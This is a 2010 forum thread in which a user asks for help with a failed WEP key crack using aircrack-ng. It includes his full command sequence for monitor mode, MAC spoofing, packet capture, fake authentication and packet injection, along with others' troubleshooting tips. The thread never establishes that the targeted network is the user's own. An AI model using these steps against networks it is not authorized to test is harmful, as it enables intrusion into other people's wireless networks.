---
title: "Dont know what wrong with my aircrack"
date: 2010-12-19
forum: Networking &amp; Wireless
---

### Post by crownclown on 2010-12-19
Well i've try to crack a wep but it's so many times but still cant..by using my friend laptop it sure success but myne nope.

The problem is about the channel and beacons ?? can someone help me with this ?

[IMG]http://i377.photobucket.com/albums/oo218/noob_crown/Screenshot.png[/IMG]

---

### Post by spiky001 on 2010-12-19
What was the command for airmon? I used this page to start with [http://www.aircrack-ng.org/doku.php?id=simple_wep_crack](http://www.aircrack-ng.org/doku.php?id=simple_wep_crack)

---

### Post by Joe of loath on 2010-12-19
Try change the -1 in the aireplay command to a 9.

---

### Post by crownclown on 2010-12-19
> **spiky001 said:**
> What was the command for airmon? I used this page to start with [http://www.aircrack-ng.org/doku.php?id=simple_wep_crack](http://www.aircrack-ng.org/doku.php?id=simple_wep_crack)


This is the list command that im using 

1)sudo airmon-ng start wlan0
2)sudo ifconfig mon0 down 
3)sudo macchanger - m 00:11:22:33:44:55 mon0
4)sudo ifconfig mon0 up
5)sudo airodump-ng mon0
6)sudo airodump-ng -c <Channel>  -w <file name>  --bssid <mac add of wep crack> mon0
7)sudo aireplay-ng -1 6000 -a <mac add of wep crack> -h <fake mac add> mon0
8)sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b <mac add of wep crack>  -h <fake mac add> mon0

the error comes after the step number 7 . so cant proceed to step 8..
T.T :icon_frown:

---

### Post by crownclown on 2010-12-19
> **Joe of loath said:**
> Try change the -1 in the aireplay command to a 9.

Which part of it isit ?

---

### Post by spiky001 on 2010-12-19
Did you follow the link I sent all work for me have just tried it again

---

### Post by barrieluv on 2010-12-19
From my experience, the first line should read 
```
airmon-ng start wlan0 6
```
This should start monitoring channel 6.  Just change the 6 to whatever the AP channel is.

---

### Post by crownclown on 2010-12-19
> **spiky001 said:**
> Did you follow the link I sent all work for me have just tried it again

Try already still cant... stuck on the second step.
the link is using ath0 but myne mon0

---

### Post by crownclown on 2010-12-19
I saw the different 
Why is my (fix channel is mon0 : -1)
but the other not. how can i remove the fix channel which is fix at -1
1st screen shot is myne
2nd is the toturial i followed  
[IMG]http://i377.photobucket.com/albums/oo218/noob_crown/Screenshot-2.png[/IMG][IMG]http://i377.photobucket.com/albums/oo218/noob_crown/Screenshot-1.png[/IMG]

---

### Post by barrieluv on 2010-12-20
I also followed the tutorial on the Aircrack-ng site but ending changing things very slightly to get it to work for me.  You can read my version of it [here](http://barrieluv.blogspot.com/search/label/BackTrack%203%20Final).  Hope it helps.

---

### Post by crownclown on 2010-12-20
> **barrieluv said:**
> I also followed the tutorial on the Aircrack-ng site but ending changing things very slightly to get it to work for me.  You can read my version of it [here]("http://barrieluv.blogspot.com/search/label/BackTrack%203%20Final").  Hope it helps.

thx everyone for helping...
well i will try it tonight....

---

### Post by crownclown on 2010-12-23
barrier luv..seems that it still failed...
I saw the different 
Why is my (fix channel is mon0 : -1)
but the tutorial is not. 
how can i remove the fix channel which is fix at -1

---

### Post by crownclown on 2011-01-25
They said that (fix channel is mon0 : -1) is an aircrack bug...
so i've download the patch...
can someone teach me how to use the patch ? or where to be patch?

---

